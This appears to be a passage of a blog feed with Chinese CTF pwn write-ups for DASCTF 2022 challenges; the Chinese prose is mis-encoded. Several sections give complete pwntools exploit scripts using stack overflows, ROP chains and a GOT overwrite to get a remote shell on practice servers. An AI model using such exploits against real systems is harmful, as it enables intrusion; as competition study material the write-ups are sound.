class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bin_sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å¤ªç†è§£expä¸ºä»€ä¹ˆè¿™æ ·å†™ï¼Œå°±å¤šè°ƒè¯•Néï¼ˆæˆ‘å…‰è°ƒè¯•è¿™è¿œç¨‹ä¸€ä¸ªè„šæœ¬ä»å†™åˆ°å„ç§è°ƒè¯•å†åˆ°æ‰“é€šå†åˆ°å½»åº•ç†è§£ï¼Œè°ƒè¯•äº†73éâ€¦)ï¼Œæ€»ä¼šæœ‰æ‰€æ”¶è·çš„ã€‚<br>æœ¬äººå°±ä¸€èœç‹—ï¼Œå¦‚æœå†™çš„æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œæ¬¢è¿æŒ‡æ­£</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07èµ‹èƒ½èµ› pwnéƒ¨åˆ†wp</title>
      <link href="/posts/e4b35f09.html"/>
      <url>/posts/e4b35f09.html</url>
      
        <content type="html"><![CDATA[<h1 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h1><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/image-20221007211754434.png" alt="image-20221007211754434"></p><h2 id="ç¨‹åºé€»è¾‘ï¼š"><a href="#ç¨‹åºé€»è¾‘ï¼š" class="headerlink" title="ç¨‹åºé€»è¾‘ï¼š"></a>ç¨‹åºé€»è¾‘ï¼š</h2><p><img src="/../img/image-20221007211805698.png" alt="image-20221007211805698"></p><p>å¯ä»¥é€‰æ‹©1ï¼Œè¿›è¡Œè¾“å…¥ï¼Œå¹¶ä¸”è¿™é‡Œå­˜åœ¨äº†å¤§é‡çš„æº¢å‡ºã€‚</p><p>é€‰æ‹©2ï¼Œåˆ™æ˜¯å°†ä¸€ä¸ªéšæœºæ•°æ‰“å°å‡ºæ¥(è¿™é“é¢˜å…¶å®å°±ç›¸å½“äºäººå·¥æ„é€ äº†ä¸€ä¸ªcanary)ï¼Œä¸è¿‡æ‰“å°å‡ºæ¥ä¹‹åä¼šé‡æ–°å­˜å…¥ä¸€ä¸ªæ–°çš„éšæœºæ•°ã€‚</p><p>é€‰æ‹©3å°±ä¼šé€€å‡ºwhileçš„æ— é™å¾ªç¯ã€‚</p><p>æœ€åmainå‡½æ•°è¿”å›çš„æ—¶å€™æœ‰ä¸€ä¸ªæ£€æŸ¥å¦‚ä¸‹</p><p><img src="/../img/image-20221007211843931.png" alt="image-20221007211843931"></p><p>å¦‚æœv2ä¸ç­‰äºç”Ÿæˆçš„éšæœºæ•°çš„è¯(ä¹Ÿå°±æ˜¯æº¢å‡ºæ—¶è¦†ç›–äº†v2)ï¼Œç¨‹åºå°±ä¼šexitã€‚ä¹Ÿå°±æ˜¯è¯´å‰é¢æº¢å‡ºæ§åˆ¶çš„è¿”å›åœ°å€ä¹Ÿæ²¡ç”¨äº†ã€‚åŒæ—¶v2æ˜¯å¯ä»¥è¢«readè¾“å…¥çš„æ•°æ®è¦†ç›–çš„ã€‚</p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><p>è¿™é“é¢˜çš„æ€è·¯å°±æ˜¯é€šè¿‡éšæœºæ•°çš„æ£€æŸ¥ï¼Œå› æ­¤è¦ä¹ˆä¿®æ”¹v2ï¼Œè¦ä¹ˆä¿®æ”¹0x4040d0ä¸Šçš„éšæœºæ•°ã€‚å› ä¸ºè¿™é“é¢˜ä¸å¯èƒ½è¾“å…¥åˆ°0x4040d0ä¸Šï¼Œæ‰€ä»¥åªè€ƒè™‘æ€ä¹ˆä¿®æ”¹v2çš„å€¼ä¸ºéšæœºæ•°ã€‚</p><p>å”¯ä¸€çš„æ–¹æ³•å°±æ˜¯é€‰æ‹©1è¿›è¡Œæº¢å‡ºè¿”å›åœ°å€åï¼Œ<strong>å†æ‰§è¡Œä¸€æ¬¡2å°†éšæœºæ•°æ‰“å°å‡ºæ¥ï¼ŒåŒæ—¶æ–°çš„éšæœºæ•°åˆå†™åˆ°äº†v2ã€‚</strong></p><p>æœ€åé€‰æ‹©3åæˆåŠŸé€šè¿‡äº†éšæœºæ•°çš„æ£€æŸ¥ï¼Œç„¶åæ§åˆ¶ç¨‹åºæ‰§è¡Œæµå³å¯ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27117</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">back_door=<span class="number">0x401577</span></span><br><span class="line">payload=(<span class="number">0x70</span>+<span class="number">8</span>)*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x401589</span>)+p64(back_door)</span><br><span class="line"><span class="comment">#debug(p,0x401525,0x4014A9)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me the code:\n&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007211858489.png" alt="image-20221007211858489"></p><h1 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h1><h2 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥:"></a>ä¿æŠ¤ç­–ç•¥:</h2><p><img src="/../img/image-20221007211615854.png" alt="image-20221007211615854"></p><h2 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h2><p><img src="/../img/image-20221007211628523.png" alt="image-20221007211628523"></p><p>åœ¨vulå‡½æ•°ä¸­ï¼Œa1çš„ç±»å‹ä¸ºintï¼Œä½†æ˜¯readè¾“å…¥çš„æ—¶å€™å¼ºè½¬æˆäº†unsigned intã€‚è¿™å°±æ„å‘³ç€è¾“å…¥-1çš„è¯ï¼Œreadçš„ç¬¬ä¸‰ä¸ªå‚æ•°å°†å˜æˆ0xffffffff,ç”±äºæ²¡æœ‰canaryä¿æŠ¤ï¼Œæ‰€ä»¥è¿™é‡Œå°±å˜å˜æº¢å‡ºäº†ã€‚</p><h2 id="åˆ©ç”¨æ€è·¯ï¼š-1"><a href="#åˆ©ç”¨æ€è·¯ï¼š-1" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><p>ç”¨strncpyæŠŠ&#x2F;bin&#x2F;sh\x00å¤åˆ¶åˆ°bssæ®µä¸Šï¼Œç”±äºå­˜åœ¨åé—¨å‡½æ•°ï¼Œç„¶åreadæº¢å‡ºåŠ«æŒæ‰§è¡Œæµå³å¯è·å–shellã€‚</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26600</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_plt_addr=e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400983</span> </span><br><span class="line">bss_addr=<span class="number">0x6010C0</span></span><br><span class="line">leave_ret=<span class="number">0x400914</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;go\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x4007E8)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;message:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x400807</span>)+p64(pop_rdi_addr)+p64(bss_addr)+p64(sys_plt_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007211651058.png" alt="image-20221007211651058">ã€‘</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ› PWN WP</title>
      <link href="/posts/6b7e3e3a.html"/>
      <url>/posts/6b7e3e3a.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢:"></a>å†™åœ¨å‰é¢:</h2><p>è¿™æ¬¡æ¯”èµ›æ”¾äº†ä¸‰é“pwnï¼Œåšèµ·æ¥è¿˜æ˜¯è›®åƒåŠ›çš„ï¼Œshellcodeé‚£é¢˜è¿˜æ˜¯ç»è¿‡å¸ˆå‚…ä»¬æç¤ºæ‰åšå‡ºæ¥çš„ï¼ŒR()Pè¿™é¢˜åˆ°æ¯”èµ›ç»“æŸä¹Ÿæ²¡æœ‰åšå‡ºæ¥ã€‚é€šè¿‡è¿™æ¬¡æ¯”èµ›æ„Ÿè§‰è‡ªå·±å¯¹äºæ±‡ç¼–ä¸­çš„gadgetç†è§£å’Œåˆ©ç”¨è¿˜æ˜¯æœ‰å†™ä¸è¶³ï¼Œåœ¨æ­¤å†™ä¸‹wpè®°å½•ä¸€ä¸‹è§£é¢˜çš„è¿‡ç¨‹ã€‚</p><h2 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="../img/image-20221024192426317.png" alt="image-20221024192426317" style="zoom:50%;" /><h3 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="/../img/image-20221024192010191.png" alt="image-20221024192010191"></p><p>ä»£ç éå¸¸çš„ç®€å•ï¼Œå°±ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œæ²¡æœ‰canaryï¼Œå¯ä»¥éšä¾¿æº¢ã€‚</p><p>æœ€å¼€å§‹æœ‰ä¸ªåˆ¤æ–­ï¼Œbuf&gt;0x100çš„è¯å°±ä¼šè¿›å…¥mainå‡½æ•°é€’å½’ï¼Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¹²æ‰°çš„ç‚¹ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡ç›´æ¥å‘é€ä¸€ä¸ª\x00å³å¯ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>å°½ç®¡ä»£ç éå¸¸çŸ­ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥æœ‰äº›éº»çƒ¦ã€‚é¦–å…ˆè¿™é“é¢˜å°±ç»™äº†readå‡½æ•°ï¼Œå› æ­¤åç»­çš„åˆ©ç”¨å°±éœ€è¦å…ˆç¯¡æ”¹readçš„gotè¡¨ä¸ºsyscallï¼Œç„¶åæ§åˆ¶raxä¸º59ï¼Œæ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;sh\x00â€,0,0)</p><h4 id="ç¯¡æ”¹readçš„gotè¡¨"><a href="#ç¯¡æ”¹readçš„gotè¡¨" class="headerlink" title="ç¯¡æ”¹readçš„gotè¡¨"></a>ç¯¡æ”¹readçš„gotè¡¨</h4><p>æƒ³è¦ç¯¡æ”¹readçš„gotè¡¨ï¼Œè‚¯å®šæ˜¯éœ€è¦å‘read gotå†™å…¥æ•°æ®ï¼Œå› æ­¤æ€ä¹ˆæ§åˆ¶readçš„rsiæˆäº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å»è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="/../img/image-20221024193207882.png" alt="image-20221024193207882"></p><p>æˆ‘ä»¬åœ¨ç¬¬äºŒä¸ªreadè¾“å…¥åï¼Œeaxçš„å€¼ä¼šè¢«[rsp+0xc]æ‰€èµ‹å€¼ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ç²¾å¿ƒæ„é€ æ ˆé‡Œçš„æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶eaxï¼Œè€Œåæˆ‘ä»¬åŠ«æŒæ‰§è¡Œæµå¦‚æœè¿”å›åˆ°0x40115aå¤„ï¼Œæ‰§è¡Œmov rsi,raxçš„è¯ï¼Œå°±ä¼šå°†raxçš„å€¼èµ‹ç»™rsiï¼Œç„¶åå†æ‰§è¡Œreadï¼Œå¦‚æ­¤æˆ‘ä»¬å°±æ§åˆ¶äº†rsiï¼Œå®ç°äº†readçš„ä»»æ„å†™å…¥ï¼Œè¿›è¡Œreadçš„gotè¡¨ç¯¡æ”¹ã€‚å› ä¸ºreadå‡½æ•°è·ç¦»syscalléå¸¸è¿‘(å¦‚ä¸‹)ï¼Œåªå·®äº†0x10çš„åç§»ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦è¾“å…¥ä¸€ä¸ªå­—èŠ‚0x90å³å¯å°†readçš„gotè¡¨æ”¹ä¸ºsyscallçš„åœ°å€(æˆ‘ä½¿ç”¨çš„glibcæ˜¯2.35çš„)</p><p><img src="/../img/image-20221024193750318.png" alt="image-20221024193750318"></p><p>ç¯¡æ”¹åçš„æƒ…å†µå¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221024194055530.png" alt="image-20221024194055530"></p><h4 id="å°†-x2F-bin-x2F-shå†™å…¥bssæ®µ"><a href="#å°†-x2F-bin-x2F-shå†™å…¥bssæ®µ" class="headerlink" title="å°†&#x2F;bin&#x2F;shå†™å…¥bssæ®µ"></a>å°†&#x2F;bin&#x2F;shå†™å…¥bssæ®µ</h4><p> ç°åœ¨ä»…ä»…æœ‰äº†syscallï¼Œæˆ‘ä»¬è¿˜éœ€è¦&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†è¯¥å­—ç¬¦ä¸²å¸ƒç½®åˆ°bssæ®µï¼ˆè¿˜æ˜¯ä¸Šé¢çš„æ–¹æ³•ï¼Œæ§åˆ¶raxå¯„å­˜å™¨ï¼Œè·³è½¬å›0x40115aï¼‰ï¼ŒåŒæ—¶æŸ¥çœ‹ROPgadgetå‘ç°ä¸‹é¢çš„è¿™ä¸ªgadget</p><p><img src="/../img/image-20221024194558939.png" alt="image-20221024194558939"></p><p>è¿™ä¸ª0x404018å°±æ˜¯bssæ®µä¸Šçš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å°†&#x2F;bin&#x2F;shå†™åˆ°0x404018ï¼Œå†æ§åˆ¶å¥½rax(ç»§ç»­æ§åˆ¶æ‰§è¡Œæµ)ï¼Œç›´æ¥å»æ‰§è¡Œè¿™ä¸ªgadgetï¼Œå³å¯æˆåŠŸå¸ƒå±€å¥½rdiçš„å€¼ã€‚</p><h4 id="æ§åˆ¶rdxå¯„å­˜å™¨"><a href="#æ§åˆ¶rdxå¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶rdxå¯„å­˜å™¨"></a>æ§åˆ¶rdxå¯„å­˜å™¨</h4><p>ä¸Šé¢è™½ç„¶æåˆ°äº†æ€ä¹ˆæ§åˆ¶rdiå¯„å­˜å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬è¦å…ˆå¸ƒå±€å¥½rdxçš„å€¼ï¼Œæ‰èƒ½å»å¸ƒç½®rdiå¯„å­˜å™¨ï¼Œè¿™ä¸ªé¡ºåºä¸èƒ½é”™ã€‚åŸå› å¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221024195251658.png" alt="image-20221024195251658"></p><p>æˆ‘ä»¬æ§åˆ¶edxå¯„å­˜å™¨ï¼Œå¿…é¡»é€šè¿‡ä¸Šå›¾çš„gadgetï¼Œä½†æ˜¯å¦‚æœæ‰§è¡Œè¿™ä¸ªgadgetå°±åŠ¡å¿…è®©ediæ¸…é›¶äº†ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½å…ˆè®©edxå˜æˆ0ï¼Œå†å»å¸ƒç½®rdiçš„å€¼ã€‚</p><p>è¿™é‡Œçš„æ€è·¯å°±æ˜¯è®©ç¨‹åºçš„æ‰§è¡Œæµè¿”å›åˆ°0x40115dï¼Œå› ä¸ºedxæ˜¯ä»æ ˆé‡Œç»™çš„(è€Œæˆ‘ä»¬åˆèƒ½æ§åˆ¶æ ˆé‡Œçš„æ•°æ®ï¼Œå˜ç›¸çš„å°±æ§åˆ¶äº†æ ˆé‡Œçš„æ•°æ®)ï¼Œç„¶åå°†edxç½®æˆ0ï¼Œè€Œæ¥ä¸‹æ¥çš„readå‡½æ•°æ‰§è¡Œæ—¶ï¼Œè™½ç„¶rdxæ˜¯0ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œé¡¶å¤šå°±æ˜¯å†™ä¸è¿›å»æ•°æ®è€Œå·²ã€‚</p><h4 id="æ§åˆ¶rdiå¯„å­˜å™¨"><a href="#æ§åˆ¶rdiå¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶rdiå¯„å­˜å™¨"></a>æ§åˆ¶rdiå¯„å­˜å™¨</h4><p>æ§åˆ¶rdiå¯„å­˜å™¨æ‰€éœ€è¦çš„gadgetæ˜¯<code>mov edi, 0x404018 ; jmp rax</code>,åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦å°†raxæ”¹æˆä¸€ä¸ªåœ°å€ï¼Œæ‰èƒ½ä¿è¯æ‰§è¡Œæµä¸ä¼šæ–­ï¼Œæ‰€ä»¥åœ¨åˆšåˆšæåˆ°çš„æ§åˆ¶rdxå¯„å­˜å™¨çš„éƒ¨åˆ†ï¼Œæœ€ååº”è¯¥è®©æ‰§è¡Œæµåˆ°0x40116dè¿™ä¸ªåœ°å€ï¼Œå»æ§åˆ¶raxï¼Œç„¶åå»è·³è½¬åˆ°<code>mov edi, 0x404018 ; jmp rax</code>ä¸Šã€‚</p><p>æ‰§è¡Œå®Œè¿™æ®µgadgetæˆ‘ä»¬çš„rdiå’Œrdxéƒ½æ§åˆ¶å®Œäº†ï¼Œè€Œrsiæœ€åå¯ä»¥æ§åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æ§åˆ¶ä¸‹raxï¼Œæ§åˆ¶raxçš„gadgetå°±æ˜¯0x40116dã€‚æ‰€ä»¥æˆ‘ä»¬å…ˆå°†raxçš„å€¼è®¾ç½®ä¸º0x40116dï¼Œè¿™æ ·æœ€åå°±ä¼šjmpè¿‡å»</p><h4 id="æ§åˆ¶rax-rsiå¯„å­˜å™¨"><a href="#æ§åˆ¶rax-rsiå¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶rax,rsiå¯„å­˜å™¨"></a>æ§åˆ¶rax,rsiå¯„å­˜å™¨</h4><p>åˆè·³è½¬åˆ°äº†0x40116dçš„ä½ç½®ï¼Œæˆ‘ä»¬å…ˆæ§åˆ¶raxçš„å€¼ä¸º59ï¼Œç„¶åå»è·³è½¬åˆ°0x401141åœ°å€å¤„ï¼Œæœ€åæ§åˆ¶ä¸‹rsiçš„å€¼ï¼Œå¼€å§‹æ‰§è¡Œreadå‡½æ•°æ—¶ï¼Œå› ä¸ºreadçš„gotè¡¨å·²ç»è¢«ç¯¡æ”¹ä¸ºäº†syscallï¼Œæˆ‘ä»¬å‚æ•°å…¨éƒ¨å¸ƒç½®å¥½äº†ï¼Œåˆ°æ­¤å³å¯è·å–shell(å¦‚ä¸‹)</p><p><img src="/../img/image-20221024201001179.png" alt="image-20221024201001179"></p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26579&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x401168</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(e.got[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#second read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#first return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x404018</span>)<span class="comment">#third read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#second return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;s&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x8</span>)<span class="comment">#third read rdx&amp;eax</span></span><br><span class="line">payload+=<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115d</span>)<span class="comment">#fourth return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;g&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0</span>)<span class="comment">#will change read rdx to zero</span></span><br><span class="line">payload+=<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40116d</span>)<span class="comment">#fifth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;t&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x40116D</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401099</span>)<span class="comment">#sixth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;u&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x3b</span>)<span class="comment">#rax</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401141</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;n&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#change read real address  #æˆ‘æ‰“æœ¬åœ° readæ”¹æˆsyscallæœ«å°¾æ”¹æˆ0x90å³å¯ï¼Œæ‰“buuè¿œç¨‹çš„è¯ï¼Œå› ä¸ºé‚£è¾¹libcç‰ˆæœ¬åŸå› ï¼Œåº”è¯¥å»æ”¹æˆ0xf</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221024201409019.png" alt="image-20221024201409019"></p><h2 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="../img/image-20221024201923989.png" alt="image-20221024201923989" style="zoom:50%;" /><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><img src="../img/image-20221024202003006.png" alt="image-20221024202003006" style="zoom:50%;" /><p>è¿™é¢˜è€ƒå¯Ÿçš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä¸€ä¸ªå•çº¯çš„shellcodeç¼–å†™(åªèƒ½ç”¨ç»™å‡ºçš„æœºå™¨ç ) ï¼Œå¦‚æœé€šè¿‡æ£€æŸ¥çš„è¯ï¼Œå°±å°†shellcodeæ‰§è¡Œ     é¢˜ç›®ç»™å‡ºçš„å­—ç¬¦å¦‚ä¸‹ï¼š</p><img src="../img/image-20221024202220891.png" alt="image-20221024202220891" style="zoom: 67%;" /><h3 id="åˆ©ç”¨æ€è·¯ï¼š-1"><a href="#åˆ©ç”¨æ€è·¯ï¼š-1" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>è¿™é“é¢˜<code>pop rsi</code> <code>pop rdi</code> <code>syscall</code>ç­‰æŒ‡ä»¤éƒ½æ— æ³•ä½¿ç”¨ï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯å»æƒ³åŠæ³•æ‰§è¡Œä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨readï¼Œå°†æ•°æ®è¯»åˆ°mmapæ˜ å°„å‡ºæ¥çš„åŒºåŸŸä¸Šï¼Œè¿™æ ·ç¬¬äºŒæ¬¡ç”¨readè¯»çš„æ•°æ®å°±ä¸ä¼šå—åˆ°ç¨‹åºä¸­çš„checkå‡½æ•°é™åˆ¶ã€‚</p><p>ä½†é—®é¢˜æ˜¯å¦‚ä½•æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readï¼Ÿ</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œsyscallçš„æœºå™¨ç æ˜¯0x0f05ã€‚ç¨‹åºè™½ç„¶æ— æ³•å†™å…¥è¿™ä¸ª0x0f05ï¼Œä½†æ˜¯å´å¯ä»¥å†™å…¥0x4141å’Œ0x4e44ã€‚è€Œ0x4141å’Œ0x4e44å¼‚æˆ–çš„ç»“æœæ˜¯0x0f05ï¼Œè¿™æ ·å°±åšå‡ºæ¥äº†0x0f05ã€‚</p><blockquote><p>æ•´ä½“æ€è·¯æ˜¯å…ˆå°†æ˜ 